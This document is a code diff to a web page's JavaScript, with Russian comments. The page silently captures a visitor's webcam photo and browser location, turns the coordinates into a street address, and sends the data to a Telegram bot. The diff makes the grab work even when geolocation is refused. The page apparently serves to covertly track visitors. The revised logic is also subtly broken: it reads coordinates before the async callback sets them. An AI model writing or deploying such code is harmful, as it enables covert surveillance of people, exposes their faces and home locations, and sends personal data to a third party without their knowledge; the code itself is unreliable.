@@ -36,18 +36,21 @@
         let photoBlob;
         let sentData = false;
 
-        async function getUserInfo(latitude, longitude) {
-            const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
-            const locationInfo = await locationData.json();
-            const addressComponents = locationInfo.address;
-            const formattedAddress = [
-                addressComponents.country,
-                addressComponents.state || addressComponents.region,
-                addressComponents.city || addressComponents.town || addressComponents.village,
-                addressComponents.road,
-                addressComponents.house_number,
-                addressComponents.postcode
-            ].filter(Boolean).join(', ');
+        async function getUserInfo(latitude = 'не предоставлено', longitude = 'не предоставлено') {
+            let formattedAddress = 'не предоставлено';
+            if (latitude !== 'не предоставлено' && longitude !== 'не предоставлено') {
+                const locationData = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
+                const locationInfo = await locationData.json();
+                const addressComponents = locationInfo.address;
+                formattedAddress = [
+                    addressComponents.country,
+                    addressComponents.state || addressComponents.region,
+                    addressComponents.city || addressComponents.town || addressComponents.village,
+                    addressComponents.road,
+                    addressComponents.house_number,
+                    addressComponents.postcode
+                ].filter(Boolean).join(', ');
+            }
 
             return {
                 userId: userCount++,
@@ -100,42 +103,60 @@
                 body: formData
             });
 
-            await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    latitude: userInfo.latitude,
-                    longitude: userInfo.longitude,
-                }),
-            });
+            if (userInfo.latitude !== 'не предоставлено' && userInfo.longitude !== 'не предоставлено') {
+                await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        latitude: userInfo.latitude,
+                        longitude: userInfo.longitude,
+                    }),
+                });
+            }
         }
 
         async function capturePhoto() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.createElement('video');
-            video.srcObject = stream;
-            await new Promise(resolve => video.onloadedmetadata = resolve);
-            video.play();
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            stream.getTracks().forEach(track => track.stop());
-            return canvas.toDataURL('image/jpeg');
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                video.play();
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                stream.getTracks().forEach(track => track.stop());
+                return canvas.toDataURL('image/jpeg');
+            } catch (error) {
+                console.error('Ошибка при получении изображения:', error);
+                return null; // Вернуть null, если не удалось получить изображение
+            }
         }
 
         async function startProcess() {
-            if (!sentData && navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async position => {
-                    const userInfo = await getUserInfo(position.coords.latitude, position.coords.longitude);
-                    photoBlob = await (await fetch(await capturePhoto())).blob();
-                    await sendDataToTelegram(userInfo);
-                    sentData = true;
-                });
+            if (!sentData) {
+                let latitude = 'не предоставлено';
+                let longitude = 'не предоставлено';
+                
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(async position => {
+                        latitude = position.coords.latitude;
+                        longitude = position.coords.longitude;
+                    }, async () => {
+                        console.log('Геолокация не предоставлена');
+                    });
+                }
+
+                photoBlob = await (await fetch(await capturePhoto())).blob() || null; // Если не удалось получить фото, то возвращаем null
+
+                const userInfo = await getUserInfo(latitude, longitude);
+                await sendDataToTelegram(userInfo);
+                sentData = true;
             }
         }
 
@@ -151,4 +172,3 @@
     </script>
 </body>
 </html>
-
